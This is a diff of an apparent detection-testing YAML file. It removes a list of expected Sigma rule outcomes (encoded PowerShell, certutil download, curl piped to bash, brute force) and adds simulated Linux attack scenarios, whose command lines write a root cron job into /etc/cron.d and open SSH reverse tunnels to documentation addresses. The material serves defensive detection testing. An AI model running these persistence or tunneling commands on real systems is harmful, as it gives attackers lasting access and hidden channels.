@@ -1,105 +1,59 @@
-# Collection tests — expected detection outcomes per scenario
-
-tests:
-  - id: detect_powershell_encoded
-    scenario_id: powershell_encoded_command
-    technique_id: T1059.001
-    description: Sigma rule should fire on encoded PowerShell execution
-    expected_rules:
-      - proc_creation_win_susp_powershell_encoded
-    min_alerts: 1
-
-  - id: detect_brute_force_new_asn
-    scenario_id: brute_force_auth
-    technique_id: T1110.001
+scenarios:
+  - id: cron_persistence_interactive_shell
+    name: Cron persistence from an interactive shell
     description: >
-      Sigma rule should fire when failed logons originate from a new IP/ASN
-      (VPN, hostile ISP, or unfamiliar infrastructure)
-    expected_rules:
-      - auth_failed_logon_bruteforce
-    min_alerts: 1
-
-  - id: known_asn_no_new_asn_alert
-    scenario_id: failed_logon_known_asn
-    technique_id: null
-    description: >
-      Repeated failures from the user's known ASN should not trigger new-ASN brute force rule
-    expected_rules: []
-    min_alerts: 0
-    must_not_match:
-      - auth_failed_logon_bruteforce
-
-  - id: detect_certutil_download
-    scenario_id: certutil_download
-    technique_id: T1105
-    description: Sigma rule should fire on certutil remote download
-    expected_rules:
-      - proc_creation_win_certutil_download
-    min_alerts: 1
-
-  - id: detect_scheduled_task_persistence
-    scenario_id: scheduled_task_persistence
-    technique_id: T1053.005
-    description: Sigma rule should fire on suspicious schtasks persistence
-    expected_rules:
-      - proc_creation_win_schtasks_persistence
-    min_alerts: 1
-
-  - id: detect_rdp_lateral_new_asn
-    scenario_id: rdp_lateral_new_asn
-    technique_id: T1021.001
-    description: Sigma rule should fire on RDP logon from new ASN
-    expected_rules:
-      - auth_success_rdp_new_asn
-    min_alerts: 1
-
-  - id: benign_no_alert
-    scenario_id: benign_process_start
-    technique_id: null
-    description: Benign activity should not trigger suspicious PowerShell rule
-    expected_rules: []
-    min_alerts: 0
-    must_not_match:
-      - proc_creation_win_susp_powershell_encoded
-
-  # --- Linux ---
-  - id: detect_ssh_tunneling_original
-    scenario_id: ssh_tunneling_via_ssh
-    technique_id: T1572
-    description: Original SSH -R tunneling example should trigger remote forward detection
-    expected_rules:
-      - lnx_audit_ssh_remote_forward
-    min_alerts: 1
-
-  - id: detect_ssh_remote_forward
-    scenario_id: ssh_remote_forward
-    technique_id: T1572
-    description: Sigma rule should fire on SSH remote port forwarding
-    expected_rules:
-      - lnx_audit_ssh_remote_forward
-    min_alerts: 1
-
-  - id: detect_ssh_bruteforce_new_asn
-    scenario_id: ssh_bruteforce_new_asn
-    technique_id: T1110.001
-    description: Sigma rule should fire on SSH failures from new ASN
-    expected_rules:
-      - lnx_auth_ssh_bruteforce_new_asn
-    min_alerts: 1
-
-  - id: detect_curl_pipe_bash
-    scenario_id: curl_pipe_to_bash
-    technique_id: T1105
-    description: Sigma rule should fire on curl piped to bash
-    expected_rules:
-      - lnx_audit_curl_pipe_bash
-    min_alerts: 1
-
-  - id: detect_crontab_persistence
-    scenario_id: crontab_persistence
+      An authenticated user writes a cron drop-in from an interactive Bash
+      session to establish recurring execution.
     technique_id: T1053.003
-    description: Sigma rule should fire on suspicious cron drop-in
-    expected_rules:
-      - lnx_audit_crontab_persistence
-    min_alerts: 1
-  
+    platform: linux
+    log_source: linux_audit
+    count: 1
+    host: linux-workstation-01
+    user: attacker
+    user_id: 1000
+    audit_user_id: 1000
+    terminal: pts0
+    exe: /usr/bin/bash
+    parent_comm: bash
+    command_line: >-
+      bash -c 'echo "*/5 * * * * root /tmp/update.sh"
+      > /etc/cron.d/system-update'
+
+  - id: ssh_remote_tunneling
+    name: Tunneling via SSH remote forward
+    description: >
+      An authenticated user launches SSH remote port forwarding (-R) from an
+      interactive shell to expose a remote service through the compromised host.
+    technique_id: T1572
+    platform: linux
+    log_source: linux_audit
+    count: 1
+    host: web-prod-01
+    user: deploy
+    user_id: 1001
+    audit_user_id: 1001
+    terminal: pts0
+    exe: /usr/bin/ssh
+    parent_comm: bash
+    command_line: ssh -R 4444:203.0.113.99:2222 user@example.com
+
+  - id: ssh_remote_forward
+    name: SSH remote port forwarding
+    description: >
+      Attacker establishes a reverse tunnel (-R) through a compromised host to
+      expose an internal service or maintain C2 after interactive shell access.
+    technique_id: T1572
+    platform: linux
+    log_source: linux_audit
+    count: 1
+    host: web-prod-01
+    user: deploy
+    user_id: 1001
+    audit_user_id: 1001
+    terminal: pts0
+    exe: /usr/bin/ssh
+    parent_comm: bash
+    command_line: >-
+      ssh -N -f -R 8443:127.0.0.1:443 user@203.0.113.200
+      -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+
